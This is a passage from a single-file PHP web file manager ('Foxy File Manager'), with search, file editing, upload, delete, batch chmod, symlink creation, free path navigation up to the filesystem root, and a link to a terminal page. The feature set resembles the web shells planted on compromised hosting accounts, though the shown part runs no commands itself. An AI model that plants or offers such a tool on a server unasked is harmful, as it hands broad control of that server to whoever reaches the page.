        <p class="search-info">"<strong><?php echo htmlspecialchars($arama_sorgu); ?></strong>" için <?php echo count($arama_sonuc); ?> sonuç bulundu (<?php echo htmlspecialchars($mevcut); ?> içinde)</p>
        <?php if (!empty($arama_sonuc)): ?>
        <table><thead><tr><th>Dosya/Klasör</th><th>Tam Yol</th><th>Boyut</th><th>İşlem</th></tr></thead><tbody>
        <?php foreach ($arama_sonuc as $s):
            $is_dir = is_dir($s);
            $rel_s = $base === '/' ? ltrim($s, '/') : trim(str_replace('\\', '/', substr($s, $base_len)), '/');
            $icon = dosya_ikon(basename($s), $is_dir);
        ?>
        <tr>
            <td><span class="icon"><?php echo $icon; ?></span> <?php echo htmlspecialchars(basename($s)); ?></td>
            <td class="path"><?php echo htmlspecialchars($s); ?></td>
            <td><?php echo $is_dir ? 'Klasör' : format_boyut(@filesize($s)); ?></td>
            <td>
                <?php if ($is_dir): ?>
                    <a href="?p=<?php echo urlencode($rel_s); ?>" class="btn">Aç</a>
                <?php else: ?>
                    <a href="?duzenle=<?php echo urlencode($rel_s); ?>&p=<?php echo urlencode(dirname($rel_s)); ?>" class="btn">Düzenle</a>
                    <a href="?indir=<?php echo urlencode($rel_s); ?>" class="btn">İndir</a>
                <?php endif; ?>
            </td>
        </tr>
        <?php endforeach; ?>
        </tbody></table>
        <?php else: ?>
        <p style="margin-top:2rem;text-align:center;color:#64748b;font-size:1.2rem">Sonuç bulunamadı.</p>
        <?php endif; ?>
    </div></body></html>
    <?php exit;
}

// ═══════════════════════════════════════════
//  DÜZENLEME SAYFASI
// ═══════════════════════════════════════════
$duzenle_dosya = isset($_GET['duzenle']) ? guvenli_path($base, $_GET['duzenle']) : null;
if ($duzenle_dosya && (!is_file($duzenle_dosya) || filesize($duzenle_dosya) > $max_duzenleme_boyutu)) $duzenle_dosya = null;
$rel_duzenle = $duzenle_dosya
    ? ($base === '/' ? ltrim($duzenle_dosya, '/') : trim(str_replace('\\', '/', substr($duzenle_dosya, $base_len)), '/'))
    : '';

if ($duzenle_dosya) {
    $icerik = @file_get_contents($duzenle_dosya);
    $is_image = resim_mi($duzenle_dosya);
    $ext = strtolower(pathinfo($duzenle_dosya, PATHINFO_EXTENSION));
    $sahip = dosya_sahip($duzenle_dosya);
    $perm_oct = substr(sprintf('%o', @fileperms($duzenle_dosya)), -4);
    $perm_rwx = perm_str(@fileperms($duzenle_dosya));
    ?>
    <!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Düzenle - <?php echo htmlspecialchars(basename($duzenle_dosya)); ?></title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0e14;color:#e2e8f0;min-height:100vh}
        .topbar{background:linear-gradient(135deg,#0d3d3d,#0d4f4f);padding:.75rem 1rem;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:.5rem}
        .topbar h1{font-size:1rem;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:60vw}
        .topbar-actions{display:flex;gap:.5rem;flex-wrap:wrap}
        .btn{padding:.5rem 1rem;background:#0d4f4f;color:#fff;border:none;border-radius:6px;cursor:pointer;text-decoration:none;font-size:.875rem;display:inline-flex;align-items:center;gap:.35rem}
        .btn:hover{background:#14b8a6;color:#0a0e14}
        .btn-save{background:linear-gradient(135deg,#14b8a6,#0d9488);color:#fff;font-weight:700}
        .btn-save:hover{background:#2dd4bf}
        .editor-area{padding:1rem}
        textarea{width:100%;min-height:75vh;font-family:'Cascadia Code','Fira Code','Consolas',monospace;font-size:13px;line-height:1.6;padding:1rem;background:#111827;border:1px solid #334155;border-radius:10px;color:#e2e8f0;resize:vertical;tab-size:4;outline:none}
        textarea:focus{border-color:#14b8a6}
        .file-info{display:flex;gap:2rem;flex-wrap:wrap;padding:0 1rem 1rem;font-size:.8rem;color:#64748b}
        .file-info span{display:flex;align-items:center;gap:.35rem}
        .file-info strong{color:#94a3b8}
        .perm-box{display:flex;gap:.5rem;align-items:center;padding:0 1rem 1rem;flex-wrap:wrap}
        .perm-box input[type=text]{width:70px;padding:6px;background:#111827;border:1px solid #334155;border-radius:6px;color:#fff;font-size:.875rem;text-align:center}
        .preview-img{max-width:100%;max-height:500px;border-radius:8px;margin:1rem 0}
    </style></head><body>
    <div class="topbar">
        <h1><?php echo dosya_ikon(basename($duzenle_dosya)); ?> <?php echo htmlspecialchars(basename($duzenle_dosya)); ?></h1>
        <div class="topbar-actions">
            <a href="?indir=<?php echo urlencode($rel_duzenle); ?>" class="btn">⬇ İndir</a>
            <a href="?p=<?php echo urlencode($relative_mevcut); ?>" class="btn">📁 Listeye Dön</a>
        </div>
    </div>

    <div class="file-info">
        <span>📏 <strong>Boyut:</strong> <?php echo format_boyut(filesize($duzenle_dosya)); ?></span>
        <span>👤 <strong>Sahip:</strong> <?php echo htmlspecialchars($sahip['user'] . ':' . $sahip['group']); ?></span>
        <span>🔒 <strong>İzin:</strong> <?php echo $perm_oct . ' (' . $perm_rwx . ')'; ?></span>
        <span>📅 <strong>Değiştirilme:</strong> <?php echo date('Y-m-d H:i:s', filemtime($duzenle_dosya)); ?></span>
        <span>📂 <strong>Yol:</strong> <?php echo htmlspecialchars($duzenle_dosya); ?></span>
    </div>

    <div class="perm-box">
        <form method="post" style="display:flex;gap:.5rem;align-items:center">
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>">
            <input type="hidden" name="chmod_uygula" value="1">
            <input type="hidden" name="chmod_yolu" value="<?php echo htmlspecialchars($rel_duzenle); ?>">
            <span style="color:#94a3b8;font-size:.8rem">chmod:</span>
            <input type="text" name="chmod_deger" value="<?php echo $perm_oct; ?>" placeholder="0644">
            <button type="submit" class="btn">Uygula</button>
        </form>
    </div>

    <?php if ($is_image): ?>
        <div class="editor-area">
            <p style="color:#94a3b8;margin-bottom:.5rem">Resim Önizleme:</p>
            <img src="?indir=<?php echo urlencode($rel_duzenle); ?>" class="preview-img" alt="preview">
        </div>
    <?php else: ?>
        <form method="post">
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>">
            <input type="hidden" name="kaydet_icerik" value="1">
            <input type="hidden" name="dosya_yolu" value="<?php echo htmlspecialchars($rel_duzenle); ?>">
            <div class="editor-area">
                <textarea name="icerik" id="editor" spellcheck="false"><?php echo htmlspecialchars($icerik); ?></textarea>
            </div>
            <div style="padding:0 1rem 1rem"><button type="submit" class="btn btn-save">💾 Kaydet</button></div>
        </form>
    <?php endif; ?>

    <script>
    document.getElementById('editor')?.addEventListener('keydown', function(e) {
        if (e.key === 'Tab') {
            e.preventDefault();
            var s = this.selectionStart, end = this.selectionEnd;
            this.value = this.value.substring(0, s) + '    ' + this.value.substring(end);
            this.selectionStart = this.selectionEnd = s + 4;
        }
        if ((e.ctrlKey || e.metaKey) && e.key === 's') {
            e.preventDefault();
            this.form.submit();
        }
    });
    </script>
    </body></html>
    <?php exit;
}

// ═══════════════════════════════════════════
//  ANA LİSTELEME SAYFASI
// ═══════════════════════════════════════════

$liste = @scandir($mevcut);
if (!$liste) $liste = [];
$oge = [];
foreach ($liste as $f) {
    if ($f === '.' || $f === '..') continue;
    $tam = $mevcut . ($mevcut === '/' ? '' : '/') . $f;
    $rel = $relative_mevcut === '' ? $f : $relative_mevcut . '/' . $f;
    $is_link = is_link($tam);
    $is_dir = is_dir($tam);
    $sahip = dosya_sahip($tam);
    $perms = @fileperms($tam);
    $oge[] = [
        'ad'     => $f,
        'rel'    => $rel,
        'tam'    => $tam,
        'klasor' => $is_dir,
        'link'   => $is_link,
        'boyut'  => is_file($tam) ? @filesize($tam) : 0,
        'izin'   => $perms !== false ? substr(sprintf('%o', $perms), -4) : '----',
        'rwx'    => $perms !== false ? perm_str($perms) : '---------',
        'sahip'  => $sahip['user'],
        'grup'   => $sahip['group'],
        'tarih'  => @date('Y-m-d H:i', @filemtime($tam)),
        'link_hedef' => $is_link ? @readlink($tam) : '',
    ];
}
usort($oge, function ($a, $b) {
    if ($a['klasor'] !== $b['klasor']) return $a['klasor'] ? -1 : 1;
    return strcasecmp($a['ad'], $b['ad']);
});

$kok_liste = @scandir($mevcut);
$kok_klasorler = [];
if ($kok_liste) {
    foreach ($kok_liste as $k) {
        if ($k === '.' || $k === '..') continue;
        $kTam = $mevcut . ($mevcut === '/' ? '' : '/') . $k;
        if (is_dir($kTam)) $kok_klasorler[] = $k;
    }
    sort($kok_klasorler, SORT_NATURAL | SORT_FLAG_CASE);
}

$disk_total = @disk_total_space($mevcut);
$disk_free  = @disk_free_space($mevcut);
$disk_used  = $disk_total ? $disk_total - $disk_free : 0;
$disk_pct   = $disk_total ? round(($disk_used / $disk_total) * 100, 1) : 0;
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Foxy File Manager — <?php echo htmlspecialchars($mevcut); ?></title>
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0e14;color:#e2e8f0;min-height:100vh}
        .topbar{background:linear-gradient(135deg,#0d3d3d,#0d4f4f);padding:.6rem 1rem;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:.5rem;position:sticky;top:0;z-index:50}
        .topbar h1{font-size:1.1rem;color:#fff;display:flex;align-items:center;gap:.5rem}
        .topbar-right{display:flex;gap:.5rem;align-items:center;flex-wrap:wrap}
        .topbar-right a,.topbar-right button{color:#e2e8f0;text-decoration:none;font-size:.8rem;padding:.4rem .75rem;background:rgba(255,255,255,.1);border:none;border-radius:6px;cursor:pointer;display:inline-flex;align-items:center;gap:.3rem}
        .topbar-right a:hover,.topbar-right button:hover{background:rgba(255,255,255,.2)}
        .toolbar{background:#111827;padding:.6rem 1rem;border-bottom:1px solid #1e293b;display:flex;gap:.5rem;flex-wrap:wrap;align-items:center}
        .btn{padding:.45rem .85rem;background:#0d4f4f;color:#fff;border:none;border-radius:6px;cursor:pointer;text-decoration:none;font-size:.8rem;display:inline-flex;align-items:center;gap:.3rem;white-space:nowrap;transition:all .15s}
        .btn:hover{background:#14b8a6;color:#0a0e14}
        .btn-danger{background:#7f1d1d}.btn-danger:hover{background:#dc2626}
        .btn-success{background:#14532d}.btn-success:hover{background:#16a34a}
        .btn-warn{background:#78350f}.btn-warn:hover{background:#d97706}
        .search-form{display:flex;gap:0;margin-left:auto}
        .search-form input{padding:.45rem .75rem;background:#0a0e14;border:1px solid #334155;border-radius:6px 0 0 6px;color:#fff;font-size:.8rem;width:180px;outline:none}
        .search-form input:focus{border-color:#14b8a6}
        .search-form button{border-radius:0 6px 6px 0;border-left:none}
        .breadcrumb{padding:.6rem 1rem;background:#1a2332;font-size:.8rem;color:#64748b;display:flex;align-items:center;gap:.5rem;flex-wrap:wrap;border-bottom:1px solid #1e293b}
        .breadcrumb a{color:#14b8a6;text-decoration:none}.breadcrumb a:hover{color:#2dd4bf}
        .breadcrumb .sep{color:#475569}
        .path-go{display:flex;gap:0;margin-left:auto}
        .path-go input{padding:.35rem .6rem;background:#0a0e14;border:1px solid #334155;border-radius:6px 0 0 6px;color:#94a3b8;font-size:.75rem;width:300px;outline:none}
        .path-go input:focus{border-color:#14b8a6;color:#fff}
        .path-go button{padding:.35rem .6rem;font-size:.75rem;border-radius:0 6px 6px 0}
        .mesaj{padding:.6rem 1rem;margin:.5rem 1rem;border-radius:8px;font-size:.875rem}
        .mesaj.ok{background:#052e16;color:#86efac;border:1px solid #14532d}
        .mesaj.hata{background:#450a0a;color:#fca5a5;border:1px solid #7f1d1d}
        .pano-bar{padding:.4rem 1rem;background:#1e3a5f;color:#93c5fd;font-size:.8rem;display:flex;align-items:center;gap:.5rem;border-bottom:1px solid #2563eb}
        .layout{display:flex;min-height:calc(100vh - 160px)}
        .sidebar{width:260px;flex-shrink:0;background:#111827;border-right:1px solid #1e293b;overflow-y:auto;display:flex;flex-direction:column}
        .sidebar-section{padding:.5rem 0;border-bottom:1px solid #1e293b}
        .sidebar-title{padding:.4rem 1rem;font-size:.7rem;color:#475569;text-transform:uppercase;letter-spacing:.05em}
        .sidebar .tree a{display:block;padding:.35rem 1rem .35rem 1.25rem;color:#cbd5e1;text-decoration:none;font-size:.8rem;border-left:3px solid transparent;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
        .sidebar .tree a:hover{background:#1e293b;color:#14b8a6}
        .sidebar .tree a.active{background:#0d3d3d;color:#14b8a6;border-left-color:#14b8a6}
        .disk-info{padding:.75rem 1rem;font-size:.75rem;color:#64748b}
        .disk-bar{height:6px;background:#1e293b;border-radius:3px;margin-top:.4rem;overflow:hidden}
        .disk-bar-fill{height:100%;border-radius:3px;transition:width .3s}
        .content{flex:1;overflow-x:auto;padding:0}
        table{width:100%;border-collapse:collapse}
        th,td{padding:.5rem .75rem;text-align:left;border-bottom:1px solid #1e293b;font-size:.8rem}
        th{background:#111827;color:#94a3b8;font-weight:600;position:sticky;top:0;z-index:5}
        tr:hover{background:#111827}
        tr.selected{background:#0d3d3d !important}
        td a{color:#e2e8f0;text-decoration:none;display:inline-flex;align-items:center;gap:.4rem}
        td a:hover{color:#14b8a6}
        .icon{font-size:1.1rem;flex-shrink:0}
        .link-badge{font-size:.65rem;background:#7c3aed;color:#fff;padding:1px 5px;border-radius:4px;margin-left:.3rem}
        .actions{display:flex;gap:.2rem;flex-wrap:wrap}
        .actions .btn{padding:.2rem .45rem;font-size:.7rem}
        .batch-bar{display:none;padding:.5rem 1rem;background:#1e3a5f;border-bottom:1px solid #2563eb;gap:.5rem;align-items:center;flex-wrap:wrap;position:sticky;top:44px;z-index:40}
        .batch-bar.show{display:flex}
        .batch-bar span{color:#93c5fd;font-size:.8rem}
        .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:100;align-items:center;justify-content:center;padding:1rem;backdrop-filter:blur(4px)}
        .modal-overlay.show{display:flex}
        .modal{background:#1a2332;padding:1.5rem;border-radius:14px;max-width:420px;width:100%;border:1px solid #334155}
        .modal h3{margin:0 0 1rem;color:#14b8a6;font-size:1rem}
        .modal input[type=text],.modal input[type=number]{width:100%;padding:.6rem;margin-bottom:.75rem;background:#0a0e14;border:1px solid #334155;border-radius:8px;color:#fff;font-size:.875rem;outline:none}
        .modal input:focus{border-color:#14b8a6}
        .modal-actions{display:flex;gap:.5rem;margin-top:.5rem}
        .upload-zone{border:2px dashed #334155;border-radius:12px;padding:2rem;text-align:center;color:#64748b;cursor:pointer;transition:all .2s;margin:1rem}
        .upload-zone:hover,.upload-zone.dragover{border-color:#14b8a6;color:#14b8a6;background:rgba(20,184,166,.05)}
        @media(max-width:768px){
            .sidebar{display:none}
            .path-go input{width:150px}
            .search-form input{width:120px}
        }
        input[type=checkbox]{accent-color:#14b8a6;width:15px;height:15px;cursor:pointer}
        ::-webkit-scrollbar{width:8px;height:8px}
        ::-webkit-scrollbar-track{background:#0a0e14}
        ::-webkit-scrollbar-thumb{background:#334155;border-radius:4px}
        ::-webkit-scrollbar-thumb:hover{background:#475569}
    </style>
</head>
<body>
    <div class="topbar">
        <h1>🦊 Foxy <span style="font-weight:400;font-size:.8rem;color:#94a3b8">v2.0</span></h1>
        <div class="topbar-right">
            <a href="?terminal=1&p=<?php echo urlencode($relative_mevcut); ?>">🖥️ Terminal</a>
            <a href="?cikis=1">🚪 Çıkış</a>
        </div>
    </div>

    <div class="toolbar">
        <a href="?p=<?php echo urlencode($relative_mevcut); ?>" class="btn">🔄 Yenile</a>
        <button type="button" class="btn" onclick="modalAc('m_klasor')">📁 Yeni Klasör</button>
        <button type="button" class="btn" onclick="modalAc('m_dosya')">📄 Yeni Dosya</button>
        <button type="button" class="btn" onclick="modalAc('m_upload')">⬆ Yükle</button>
        <button type="button" class="btn" onclick="modalAc('m_symlink')">🔗 Symlink</button>
        <?php if ($pano_bilgi): ?>
        <form method="post" style="display:inline"><input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>"><input type="hidden" name="yapistir" value="1"><button type="submit" class="btn btn-success">📋 Yapıştır (<?php echo htmlspecialchars($pano_bilgi); ?>)</button></form>
        <?php endif; ?>
        <form method="get" class="search-form">
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>">
            <input type="text" name="ara" placeholder="Dosya ara..." value="">
            <button type="submit" class="btn">🔍</button>
        </form>
    </div>

    <div class="breadcrumb">
        <a href="?p=">🏠 public_html</a>
        <?php
        $parcalar = array_filter(explode('/', $relative_mevcut));
        $yol_birikim = '';
        foreach ($parcalar as $seg) {
            $yol_birikim .= ($yol_birikim ? '/' : '') . $seg;
            echo '<span class="sep">/</span> <a href="?p=' . urlencode($yol_birikim) . '">' . htmlspecialchars($seg) . '</a>';
        }
        ?>
        <form method="get" class="path-go">
            <input type="text" name="p" placeholder="Yol girin... (örn: home/user/public_html)" value="<?php echo htmlspecialchars($relative_mevcut); ?>">
            <button type="submit" class="btn">Git</button>
        </form>
    </div>

    <?php if ($mesaj): ?><div class="mesaj <?php echo $mesaj_tip; ?>"><?php echo htmlspecialchars($mesaj); ?></div><?php endif; ?>
    <?php if ($pano_bilgi): ?><div class="pano-bar">📋 Panoda: <?php echo htmlspecialchars($pano_bilgi); ?> — Yapıştırmak için hedef klasöre gidin ve "Yapıştır" butonuna basın.</div><?php endif; ?>

    <div class="batch-bar" id="batchBar">
        <span id="batchCount">0 öğe seçili</span>
        <form method="post" id="batchForm" style="display:flex;gap:.3rem;flex-wrap:wrap">
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>">
            <div id="batchInputs"></div>
            <button type="submit" name="kopyala" value="1" class="btn">📋 Kopyala</button>
            <button type="submit" name="kes" value="1" class="btn btn-warn">✂ Kes</button>
            <button type="submit" name="zip_olustur" value="1" class="btn">📦 Zip Yap</button>
            <button type="submit" name="toplu_sil" value="1" class="btn btn-danger" onclick="return confirm('Seçili öğeleri silmek istediğinize emin misiniz?')">🗑 Sil</button>
            <button type="submit" name="toplu_indir" value="1" class="btn">⬇ İndir (zip)</button>
            <input type="text" name="chmod_deger" placeholder="0755" style="width:60px;padding:.3rem .5rem;background:#0a0e14;border:1px solid #334155;border-radius:6px;color:#fff;font-size:.75rem">
            <button type="submit" name="toplu_chmod" value="1" class="btn">🔒 chmod</button>
        </form>
    </div>

    <div class="layout">
        <aside class="sidebar">
            <div class="sidebar-section">
                <div class="sidebar-title">Mevcut Dizin</div>
                <div style="padding:.4rem 1rem;font-size:.75rem;color:#94a3b8;word-break:break-all"><?php echo htmlspecialchars($mevcut); ?></div>
            </div>
            <div class="sidebar-section" style="flex:1;overflow-y:auto">
                <div class="sidebar-title">Alt Klasörler</div>
                <nav class="tree">
                    <?php if ($relative_mevcut !== ''): ?>
                    <a href="?p=<?php echo urlencode(dirname($relative_mevcut) === '.' ? '' : dirname($relative_mevcut)); ?>">📂 .. (üst dizin)</a>
                    <?php endif; ?>
                    <?php foreach ($kok_klasorler as $kAd):
                        $kRel = $relative_mevcut === '' ? $kAd : $relative_mevcut . '/' . $kAd;
                    ?>
                    <a href="?p=<?php echo urlencode($kRel); ?>">📁 <?php echo htmlspecialchars($kAd); ?></a>
                    <?php endforeach; ?>
                    <?php if (empty($kok_klasorler)): ?>
                    <div style="padding:.5rem 1rem;color:#475569;font-size:.75rem">Alt klasör yok</div>
                    <?php endif; ?>
                </nav>
            </div>
            <div class="sidebar-section">
                <div class="sidebar-title">Hızlı Erişim</div>
                <nav class="tree">
                    <a href="?p=">🏠 public_html (Root)</a>
                    <a href="?p=uploads">📂 uploads</a>
                    <a href="?p=images">📂 images</a>
                    <a href="?p=cache">📂 cache</a>
                </nav>
            </div>
            <?php if ($disk_total): ?>
            <div class="disk-info">
                <div>💾 Disk: <?php echo format_boyut($disk_used); ?> / <?php echo format_boyut($disk_total); ?> (<?php echo $disk_pct; ?>%)</div>
                <div>Boş: <?php echo format_boyut($disk_free); ?></div>
                <div class="disk-bar"><div class="disk-bar-fill" style="width:<?php echo $disk_pct; ?>%;background:<?php echo $disk_pct > 90 ? '#ef4444' : ($disk_pct > 70 ? '#f59e0b' : '#14b8a6'); ?>"></div></div>
            </div>
            <?php endif; ?>
        </aside>

        <div class="content">
            <table>
                <thead>
                    <tr>
                        <th style="width:30px"><input type="checkbox" id="selectAll" title="Tümünü seç"></th>
                        <th>Ad</th>
                        <th>Boyut</th>
                        <th>Değiştirilme</th>
                        <th>İzin</th>
                        <th>Sahip</th>
                        <th>İşlemler</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($relative_mevcut !== ''): ?>
                    <tr>
                        <td></td>
                        <td colspan="6"><a href="?p=<?php echo urlencode(dirname($relative_mevcut) === '.' ? '' : dirname($relative_mevcut)); ?>"><span class="icon">📂</span> .. (üst dizin)</a></td>
                    </tr>
                    <?php endif; ?>
                    <?php if (empty($oge)): ?>
                    <tr><td colspan="7" style="text-align:center;padding:2rem;color:#475569">Bu dizin boş</td></tr>
                    <?php endif; ?>
                    <?php foreach ($oge as $o):
                        $rel_enc = urlencode($o['rel']);
                        $ad_enc = htmlspecialchars($o['ad']);
                        $icon = dosya_ikon($o['ad'], $o['klasor']);
                        $is_zip = strtolower(pathinfo($o['ad'], PATHINFO_EXTENSION)) === 'zip';
                    ?>
                    <tr data-rel="<?php echo htmlspecialchars($o['rel']); ?>">
                        <td><input type="checkbox" class="row-check" value="<?php echo htmlspecialchars($o['rel']); ?>"></td>
                        <td>
                            <?php if ($o['klasor']): ?>
                                <a href="?p=<?php echo $rel_enc; ?>"><span class="icon"><?php echo $icon; ?></span> <?php echo $ad_enc; ?>/</a>
                            <?php else: ?>
                                <a href="?duzenle=<?php echo $rel_enc; ?>&p=<?php echo urlencode($relative_mevcut); ?>"><span class="icon"><?php echo $icon; ?></span> <?php echo $ad_enc; ?></a>
                            <?php endif; ?>
                            <?php if ($o['link']): ?><span class="link-badge">symlink → <?php echo htmlspecialchars($o['link_hedef']); ?></span><?php endif; ?>
                        </td>
                        <td><?php echo $o['klasor'] ? '-' : format_boyut($o['boyut']); ?></td>
                        <td style="white-space:nowrap"><?php echo $o['tarih']; ?></td>
                        <td><code title="<?php echo $o['rwx']; ?>"><?php echo $o['izin']; ?></code></td>
                        <td style="font-size:.75rem"><?php echo htmlspecialchars($o['sahip'] . ':' . $o['grup']); ?></td>
                        <td>
                            <div class="actions">
                                <?php if (!$o['klasor']): ?>
                                    <a href="?duzenle=<?php echo $rel_enc; ?>&p=<?php echo urlencode($relative_mevcut); ?>" class="btn" title="Düzenle/Görüntüle">✏️</a>
                                    <a href="?indir=<?php echo $rel_enc; ?>" class="btn" title="İndir">⬇</a>
                                <?php endif; ?>
                                <?php if ($is_zip): ?>
                                    <form method="post" style="display:inline"><input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>"><input type="hidden" name="zip_cikar" value="1"><input type="hidden" name="zip_yolu" value="<?php echo htmlspecialchars($o['rel']); ?>"><button type="submit" class="btn" title="Zip Çıkart">📤</button></form>
                                <?php endif; ?>
                                <button type="button" class="btn" onclick="renameModal('<?php echo htmlspecialchars($o['rel'], ENT_QUOTES); ?>','<?php echo htmlspecialchars($o['ad'], ENT_QUOTES); ?>')" title="Yeniden Adlandır">✏️📝</button>
                                <form method="post" style="display:inline"><input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>"><input type="hidden" name="chmod_uygula" value="1"><input type="hidden" name="chmod_yolu" value="<?php echo htmlspecialchars($o['rel']); ?>"><input type="text" name="chmod_deger" value="<?php echo $o['izin']; ?>" style="width:48px;padding:1px 4px;font-size:11px;background:#0a0e14;border:1px solid #334155;border-radius:4px;color:#94a3b8;text-align:center" title="chmod"><button type="submit" class="btn" title="chmod Uygula">🔒</button></form>
                                <form method="post" style="display:inline" onsubmit="return confirm('Silmek istediğinize emin misiniz: <?php echo $ad_enc; ?> ?')"><input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>"><input type="hidden" name="sil_yolu" value="<?php echo htmlspecialchars($o['rel']); ?>"><button type="submit" class="btn btn-danger" title="Sil">🗑</button></form>
                            </div>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            <div style="padding:.75rem 1rem;color:#475569;font-size:.75rem">
                📊 <?php echo count($oge); ?> öğe · <?php $kls=0;$dos=0; foreach($oge as $o){if($o['klasor'])$kls++;else $dos++;} echo $kls.' klasör, '.$dos.' dosya'; ?>
            </div>
        </div>
    </div>

    <!-- Yeni Klasör -->
    <div id="m_klasor" class="modal-overlay">
        <div class="modal">
            <h3>📁 Yeni Klasör</h3>
            <form method="post">
                <input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>">
                <input type="hidden" name="yeni_klasor" value="1">
                <input type="text" name="klasor_adi" placeholder="örn. index.php" required autofocus>
                <div class="modal-actions">
                    <button type="submit" class="btn btn-success">Oluştur</button>
                    <button type="button" class="btn" onclick="modalKapa('m_klasor')">İptal</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Yeni Dosya -->
    <div id="m_dosya" class="modal-overlay">
        <div class="modal">
            <h3>📄 Yeni Dosya</h3>
            <form method="post">
                <input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>">
                <input type="hidden" name="yeni_dosya" value="1">
                <input type="text" name="dosya_adi" placeholder="dosya.txt, index.html, script.php" required>
                <div class="modal-actions">
                    <button type="submit" class="btn btn-success">Oluştur</button>
                    <button type="button" class="btn" onclick="modalKapa('m_dosya')">İptal</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Yükleme -->
    <div id="m_upload" class="modal-overlay">
        <div class="modal">
            <h3>⬆ Dosya Yükle</h3>
            <form method="post" enctype="multipart/form-data" id="uploadForm">
                <input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>">
                <div class="upload-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
                    <div style="font-size:2rem;margin-bottom:.5rem">📁</div>
                    <p>Dosyaları sürükleyip bırakın veya tıklayın</p>
                    <p style="font-size:.75rem;margin-top:.5rem">Maks: <?php echo format_boyut($max_upload_boyutu); ?> / dosya</p>
                </div>
                <input type="file" name="yukle[]" id="fileInput" multiple style="display:none">
                <div id="fileList" style="font-size:.8rem;color:#94a3b8;margin-bottom:.75rem"></div>
                <div class="modal-actions">
                    <button type="submit" class="btn btn-success">Yükle</button>
                    <button type="button" class="btn" onclick="modalKapa('m_upload')">İptal</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Symlink -->
    <div id="m_symlink" class="modal-overlay">
        <div class="modal">
            <h3>🔗 Sembolik Link Oluştur</h3>
            <form method="post">
                <input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>">
                <input type="hidden" name="symlink_olustur" value="1">
                <input type="text" name="link_hedef" placeholder="Hedef yol (örn: /home/user/public_html)" required>
                <input type="text" name="link_adi" placeholder="Link adı" required>
                <div class="modal-actions">
                    <button type="submit" class="btn btn-success">Oluştur</button>
                    <button type="button" class="btn" onclick="modalKapa('m_symlink')">İptal</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Yeniden Adlandır -->
    <div id="m_rename" class="modal-overlay">
        <div class="modal">
            <h3>✏️ Yeniden Adlandır</h3>
            <form method="post">
                <input type="hidden" name="p" value="<?php echo htmlspecialchars($relative_mevcut); ?>">
                <input type="hidden" name="yeniden_ad" value="1">
                <input type="hidden" name="eski_yol" id="rename_eski">
                <input type="text" name="yeni_ad" id="rename_yeni" placeholder="Yeni ad" required>
                <div class="modal-actions">
                    <button type="submit" class="btn btn-success">Kaydet</button>
                    <button type="button" class="btn" onclick="modalKapa('m_rename')">İptal</button>
                </div>
            </form>
        </div>
    </div>

    <script>
    function modalAc(id) { document.getElementById(id).classList.add('show'); }
    function modalKapa(id) { document.getElementById(id).classList.remove('show'); }
    document.querySelectorAll('.modal-overlay').forEach(m => {
        m.addEventListener('click', function(e) { if (e.target === this) this.classList.remove('show'); });
    });

    function renameModal(eskiYol, mevcutAd) {
        document.getElementById('rename_eski').value = eskiYol;
        document.getElementById('rename_yeni').value = mevcutAd;
        modalAc('m_rename');
    }

    var checks = document.querySelectorAll('.row-check');
    var selectAll = document.getElementById('selectAll');
    var batchBar = document.getElementById('batchBar');
    var batchCount = document.getElementById('batchCount');
    var batchInputs = document.getElementById('batchInputs');

    function updateBatch() {
        var checked = document.querySelectorAll('.row-check:checked');
        batchInputs.innerHTML = '';
        checked.forEach(function(c) {
            var inp = document.createElement('input');
            inp.type = 'hidden'; inp.name = 'secili[]'; inp.value = c.value;
            batchInputs.appendChild(inp);
        });
        if (checked.length > 0) {
            batchBar.classList.add('show');
            batchCount.textContent = checked.length + ' öğe seçili';
            document.querySelectorAll('tbody tr').forEach(function(tr) {
                var cb = tr.querySelector('.row-check');
                if (cb) tr.classList.toggle('selected', cb.checked);
            });
        } else {
            batchBar.classList.remove('show');
            document.querySelectorAll('tbody tr.selected').forEach(function(tr) { tr.classList.remove('selected'); });
        }
    }

    if (selectAll) {
        selectAll.addEventListener('change', function() {
            checks.forEach(function(c) { c.checked = selectAll.checked; });
            updateBatch();
        });
    }
    checks.forEach(function(c) {
        c.addEventListener('change', updateBatch);
    });

    var dropZone = document.getElementById('dropZone');
    var fileInput = document.getElementById('fileInput');
    var fileList = document.getElementById('fileList');

    if (dropZone) {
        ['dragenter','dragover'].forEach(function(ev) {
            dropZone.addEventListener(ev, function(e) { e.preventDefault(); e.stopPropagation(); dropZone.classList.add('dragover'); });
        });
        ['dragleave','drop'].forEach(function(ev) {
